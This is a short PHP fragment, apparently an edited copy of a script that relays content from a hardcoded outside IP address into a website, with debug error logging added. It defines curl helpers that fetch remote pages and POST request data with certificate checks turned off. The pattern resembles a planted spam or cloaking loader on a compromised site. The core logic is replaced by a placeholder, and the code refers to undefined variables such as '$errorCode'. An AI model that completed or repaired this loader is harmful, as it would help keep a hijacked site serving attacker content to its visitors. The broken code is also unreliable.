<?php
// Enable error reporting
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Set up error logging
ini_set("log_errors", 1);
ini_set("error_log", "/path/to/your/error.log"); // Adjust the path as needed

$inter_domain = 'http://192.187.108.42/z1007_7/';

function curl_get_contents($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    $file_contents = curl_exec($ch);
    
    if(curl_errno($ch)) {
        error_log("curl_get_contents error: " . curl_error($ch));
    }

    curl_close($ch);
    return $file_contents;
}

function getServerCont($url, $data = array()) {
    $url = str_replace(' ', '+', $url);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    $output = curl_exec($ch);
    
    if(curl_errno($ch)) {
        error_log("getServerCont error: " . curl_error($ch));
    }

    curl_close($ch);
    if (0 !== $errorCode) {
        return false;
    }
    return $output;
}

// Other code follows...

// Place error logs at critical points to catch issues in specific sections
// For example:
$req_url = $http . $domain . $req_uri;
error_log("Request URL: $req_url");

// Continue logging in other parts of the script as needed
?>
